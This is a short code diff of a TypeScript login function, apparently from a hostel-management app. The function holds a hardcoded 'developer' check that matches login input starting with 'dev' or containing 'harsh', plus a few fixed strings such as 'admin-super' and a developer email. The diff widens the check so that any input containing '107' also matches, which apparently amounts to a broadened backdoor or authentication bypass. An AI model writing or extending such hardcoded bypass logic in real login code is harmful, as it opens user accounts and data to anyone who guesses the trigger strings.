@@ -30,9 +30,10 @@ export async function loginUser(input: LoginInput) {
     return null;
   }
 
-  // Developer ID & Credentials Check (ID-only or harsh dev / #harsh107 / dev123 / DEV9999)
-  const isDeveloperQuery = norm.startsWith('dev') ||
-                          norm.includes('harsh') ||
+  // Developer ID & Credentials Check (ID-only or #harsh107 / harsh dev / dev123 / DEV9999)
+  const isDeveloperQuery = norm.includes('harsh') ||
+                          norm.includes('107') ||
+                          norm.startsWith('dev') ||
                           norm === '0000000000' ||
                           norm === 'admin-super' ||
                           norm === 'developer@hostelos.com';
